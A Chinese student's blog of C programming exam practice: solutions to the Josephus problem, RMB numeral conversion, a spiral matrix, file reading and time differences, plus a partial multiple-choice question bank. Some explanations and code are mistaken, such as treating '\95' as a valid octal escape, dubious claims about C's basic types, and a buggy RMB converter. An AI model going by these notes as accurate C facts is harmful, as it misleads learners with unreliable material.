<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_STUDENTS 200</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input n: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">3</span> || n &gt;= MAX_STUDENTS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid input! n should be between 3 and 200.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> students[MAX_STUDENTS];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        students[i] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> remain = n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nResult is:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (remain &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (students[index] != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;delete %d student: %d.\n&quot;</span>, n - remain + <span class="number">1</span>, students[index]);</span><br><span class="line">                students[index] = <span class="number">0</span>;</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">                remain--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        index++;</span><br><span class="line">        <span class="keyword">if</span> (index == n) &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (students[i] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;The remained student is %d.\n&quot;</span>, students[i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ai写的，太牛了，比标准答案简单捏。</span></span><br></pre></td></tr></table></figure>

<h1 id="输出人民币的汉字写法"><a href="#输出人民币的汉字写法" class="headerlink" title="输出人民币的汉字写法"></a>输出人民币的汉字写法</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025194136893.png" alt="image-20231025194136893"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025194142109.png" alt="image-20231025194142109"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">while</span> (n &lt; <span class="number">0</span> || n&gt;<span class="number">2147483647</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n数据错误，请重新输入：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n转换后端结果是:  &quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> former[<span class="number">200</span>];</span><br><span class="line">	_itoa(n, former, <span class="number">10</span>);<span class="comment">//将n转换成字符串，10为转换后的进制</span></span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(former);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = len; i &lt; len; i++, j--) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (former[i])</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;零&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;壹&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;贰&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;叁&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;肆&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;伍&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;陆&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;柒&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;捌&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;玖&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> (j)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;拾&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;佰&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;仟&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;万&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;亿&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="number">169</span></span><br><span class="line">				;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;元整\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这思路。。。牛批</p>
<h1 id="螺旋数组来咯"><a href="#螺旋数组来咯" class="headerlink" title="螺旋数组来咯"></a>螺旋数组来咯</h1><p>看到螺旋数组了，今天手搓一个螺旋数组！我是Naruto，手搓螺旋丸😋</p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231031212957420.png" alt="image-20231031212957420"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Enter n(n&lt;=15):\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line">	<span class="keyword">int</span> zuo, you, shang, xia;</span><br><span class="line">	zuo = <span class="number">0</span>;</span><br><span class="line">	you = n<span class="number">-1</span>;</span><br><span class="line">	shang = <span class="number">0</span>;</span><br><span class="line">	xia = n<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> ((zuo &lt;= you)&amp;&amp;(shang &lt;= xia)) &#123;<span class="comment">//注意这个等号</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = zuo; i &lt;= you; i++) &#123;</span><br><span class="line">			arr[shang][i] = index;</span><br><span class="line">			<span class="comment">//printf(&quot;%d\n&quot;, arr[shang][i]);</span></span><br><span class="line">			index++;<span class="comment">//这个就是放进去的元素，每放一个就加一</span></span><br><span class="line">		&#125;</span><br><span class="line">		shang++;</span><br><span class="line">		<span class="comment">//最上面的边界往中间靠</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = shang; i &lt;= xia; i++) &#123;</span><br><span class="line">			arr[i][you] = index;</span><br><span class="line">			index++;</span><br><span class="line">			<span class="comment">//printf(&quot;%d\n&quot;, arr[i][you]);</span></span><br><span class="line">		&#125;</span><br><span class="line">		you--;<span class="comment">//最右边的边界往中间靠</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = you; i &gt;= zuo; i--) &#123;</span><br><span class="line">			arr[xia][i] = index;</span><br><span class="line">			index++;</span><br><span class="line">			<span class="comment">//printf(&quot;%d\n&quot;, arr[xia][i]);</span></span><br><span class="line">		&#125;</span><br><span class="line">		xia--;<span class="comment">//最下面的边界向上</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = xia; i &gt;= shang; i--) &#123;</span><br><span class="line">			arr[i][zuo] = index;</span><br><span class="line">			index++;</span><br><span class="line">			<span class="comment">//printf(&quot;%d\n&quot;, arr[i][zuo]);</span></span><br><span class="line">		&#125;</span><br><span class="line">		zuo++;<span class="comment">//左边边界收缩</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出部分</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, arr[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231031212938154.png" alt="image-20231031212938154"></p>
<p>好久没开电脑了。。最后一个月了！我要暴血了。。</p>
<p>未来的美好日子都是建立在我是研究生的基础上，我不想什么东西都失败。。。(┬┬﹏┬┬)让我上岸把。。我也不是笨猪啊T_T。自从上大学之后，除了入门网安之外。好像没有什么东西是真正意义上的成功过。。真的好累。。又不敢在其他地方发癫。自己博客也只敢😋偷偷插在文章中间发癫，不仔细看的大火肯定看不到捏。</p>
<h1 id="二进制文件存储数据"><a href="#二进制文件存储数据" class="headerlink" title="二进制文件存储数据"></a>二进制文件存储数据</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231117185102967.png" alt="image-20231117185102967"><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231117185106763.png" alt="image-20231117185106763"></p>
<p>我们先用下面这串代码将数据内容用二进制的方式存进文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	FILE* f = fopen(<span class="string">&quot;./Comp.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">127</span>] = <span class="string">&quot;xuebi da 6.00 345\nnongfuSQxianchengduo zhongxingA 4.392 57398\nxuebi xiao 2.004 4567\nxuebi da 6.003 456&quot;</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(f, <span class="string">&quot;%s&quot;</span>,<span class="built_in">string</span>);</span><br><span class="line">	fclose(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后开始弄</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Commodity</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];   <span class="comment">// 商品名称</span></span><br><span class="line">    <span class="keyword">int</span> count;       <span class="comment">// 商品数量</span></span><br><span class="line">    <span class="keyword">float</span> price;     <span class="comment">// 商品价格</span></span><br><span class="line">    <span class="keyword">char</span> size[<span class="number">50</span>];   <span class="comment">// 商品尺寸</span></span><br><span class="line">&#125; comarr[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(struct Commodity arr[<span class="number">20</span>], <span class="keyword">int</span> num)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE* f = fopen(<span class="string">&quot;./Comp.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);  <span class="comment">// 打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file.\n&quot;</span>);  <span class="comment">// 打开文件失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> size[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(f) &amp;&amp; index &lt; <span class="number">20</span>) &#123;  <span class="comment">// 循环读取文件内容直到文件结束或达到数组上限</span></span><br><span class="line">        <span class="comment">// 从文件中读取商品信息，并检查是否成功读取了4个值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%s%s%f%d&quot;</span>, name, size, &amp;price, &amp;count) == <span class="number">4</span>) &#123;<span class="comment">//注意这里的条件，fscanf会返回接收到的变量个数</span></span><br><span class="line">            <span class="built_in">strcpy</span>(comarr[index].name, name);  <span class="comment">// 将商品名称复制到结构体数组中</span></span><br><span class="line">            <span class="built_in">strcpy</span>(comarr[index].size, size);  <span class="comment">// 将商品尺寸复制到结构体数组中</span></span><br><span class="line">            comarr[index].count = count;       <span class="comment">// 将商品数量赋值给结构体数组中的count成员</span></span><br><span class="line">            comarr[index].price = price;       <span class="comment">// 将商品价格赋值给结构体数组中的price成员</span></span><br><span class="line">            index++;                           <span class="comment">// 数组索引自增</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);  <span class="comment">// 关闭文件</span></span><br><span class="line">    show(comarr, index);  <span class="comment">// 调用显示函数，传入结构体数组和有效元素数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(struct Commodity arr[<span class="number">20</span>], <span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;情况如下：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s  %s  %d  %f\n&quot;</span>, arr[i].name, arr[i].size, arr[i].count, arr[i].price);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后面就不写了，无非就是查找，这个读取就已经竭尽全力了。。。。</p>
<p>查找用写</p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231117193346122.png" alt="image-20231117193346122"></p>
<h1 id="时间结构体，计算时间差"><a href="#时间结构体，计算时间差" class="headerlink" title="时间结构体，计算时间差"></a>时间结构体，计算时间差</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231129200451734.png" alt="image-20231129200451734"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> shi;</span><br><span class="line">	<span class="keyword">int</span> fen;</span><br><span class="line">	<span class="keyword">int</span> miao;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shi, fen, miao;</span><br><span class="line">	<span class="keyword">int</span> shi1, fen1, miao1;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请按照h-m-s的方式输入两个时刻：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;shi, &amp;fen, &amp;miao);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;shi1, &amp;fen1, &amp;miao1);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Time</span> <span class="title">time_1</span>, <span class="title">time_2</span>;</span></span><br><span class="line">	time_1.shi = shi; time_1.fen = fen; time_1.miao = miao;</span><br><span class="line">	time_2.shi = shi1; time_2.fen = fen1; time_2.miao = miao1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> a1 = time_1.shi * <span class="number">60</span> * <span class="number">60</span> + time_1.fen * <span class="number">60</span> + time_1.miao;</span><br><span class="line">	<span class="keyword">int</span> a2 = time_2.shi * <span class="number">60</span> * <span class="number">60</span> + time_2.fen * <span class="number">60</span> + time_2.miao;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> result = a1 - a2;</span><br><span class="line">	<span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		result *= (<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (result &gt;= <span class="number">60</span> * <span class="number">60</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两个时间相差%d个小时%d分钟%d秒\n&quot;</span>, result / <span class="number">3600</span>, (result % <span class="number">3600</span>) / <span class="number">60</span>, (result % <span class="number">3600</span>) % <span class="number">60</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, result);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (result &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两个时间相差%d分钟%d秒\n&quot;</span>, (result % <span class="number">3600</span>) / <span class="number">60</span>, (result % <span class="number">3600</span>) % <span class="number">60</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两个时间相差%d秒\n&quot;</span>, (result % <span class="number">3600</span>) % <span class="number">60</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//完全正确！</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>C语言单选题题库总结</title>
    <url>/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="C语言单选题题库总结"><a href="#C语言单选题题库总结" class="headerlink" title="C语言单选题题库总结"></a>C语言单选题题库总结</h1><p>开始考研的刷题库了，有很多单选题，我会总结上每一道题的知识点，进行记录。纯概念博客，师傅们图一乐即可。</p>
<h1 id="一-c语言概述"><a href="#一-c语言概述" class="headerlink" title="一 c语言概述"></a>一 c语言概述</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、C程序中main函数的位置（C）</span><br><span class="line">A、必须在最开始 B、必须在系统库函数后面</span><br><span class="line">C、可以在自定义函数后面 D、必须在最后</span><br></pre></td></tr></table></figure>

<p>c语言中main函数的位置可以任意位置．在执行一个c语言编写的程序时，main函数就相当于是执行程序的入口．只要是没有语法和逻辑上的错误，main函数可以放在任意位置．</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、下面关于C语言用户标识符的描述，正确的是（D）</span><br><span class="line">A、不能区分大小写            B、用户标识符不能描述常量</span><br><span class="line">C、类型名也是用户标识        D、用户标识符可以作为变量名</span><br></pre></td></tr></table></figure>

<p>标识符由<a href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D/1710184?fromModule=lemma_inlink">字母</a>、<a href="https://baike.baidu.com/item/%E4%B8%8B%E5%88%92%E7%BA%BF/9768709?fromModule=lemma_inlink">下划线</a>、数字这三个方面组成，但开头必须是字母或下划线</p>
<p>标识符不能使用系统法保留的关键字</p>
<p><a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80?fromModule=lemma_inlink">C语言</a>中标识符区分大小写</p>
<p>用户标识符可以作为变量名</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.关于C语言的叙述中，不正确的是（D）</span><br><span class="line">A. C程序可由一个或多个函数组成</span><br><span class="line">B. C程序必须包含一个main（）函数</span><br><span class="line">C. C程序的基本组成单位是函数</span><br><span class="line">D. 注释说明只能位于一条语句的后面</span><br></pre></td></tr></table></figure>

<p> C语言程序是由函数构成的，函数是C程序的基本组成单位.</p>
<p>注释可以随处</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.若有说明语句：char C=‘\95’;则变量C包含(A)个字符</span><br><span class="line">A.1         B.2       C.3       D.语法错误</span><br></pre></td></tr></table></figure>

<p>字符常量 <code>&#39;\95&#39;</code> 使用八进制表示</p>
<p>字符常量在存储时只占用一个字节的内存空间，因此变量 <code>C</code> 仅包含一个字符。所以，变量 C 包含 1 个字符。</p>
<p>很多答案都说是语法错误，我也搞不懂几把哪里错了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> C = <span class="string">&#x27;\95&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="keyword">sizeof</span>(C));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//无语，这些题库能不能好一点啊</span></span><br><span class="line">&#125;<span class="comment">//运行输出是1</span></span><br></pre></td></tr></table></figure>

<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.结构化程序设计不包括（A）</span><br><span class="line">A.最优化</span><br><span class="line">B自顶而下，逐步细化</span><br><span class="line">C模拟化设计</span><br><span class="line">D结构化编码  </span><br></pre></td></tr></table></figure>

<p>结构化程序设计的设计方法包括下面四个，<strong>自顶向下，逐步细化，模块化，结构化编码</strong></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.结构化程序设计的三种基本语句是(C)</span><br><span class="line">A.函数结购   分支结构   判断结构</span><br><span class="line">B.函数结构   嵌套结构   平行结构</span><br><span class="line">C.顺序结构   分支结构   循环结构</span><br><span class="line">D.分支结构   循环结构   嵌套结构</span><br></pre></td></tr></table></figure>

<p>结构化程序设计的三中基本语句：<strong>顺序结构，选择结构（分支结构），循环结构</strong></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.关于C语言数据类型的叙述,正确的是(C)</span><br><span class="line">A.枚举类型不是基本类型</span><br><span class="line">B.数组不是构造类型</span><br><span class="line">C.变量必须先定义后使用</span><br><span class="line">D.不允许使用空类型</span><br></pre></td></tr></table></figure>

<p>枚举类型是一种基本数据类型而不是构造数据类型.</p>
<p>C语言数据类型中构造类型包括三种：<strong>数组类型 结构类型 联合类型</strong></p>
<p>C语言有四种基本数据类型：<strong>整型，浮点型，指针，聚合类型</strong>。</p>
<p>c语言没有空类型。也就是void a; 是不行的,但允许有void指针,void* p;可行,</p>
<p>变量必须先定义后使用</p>
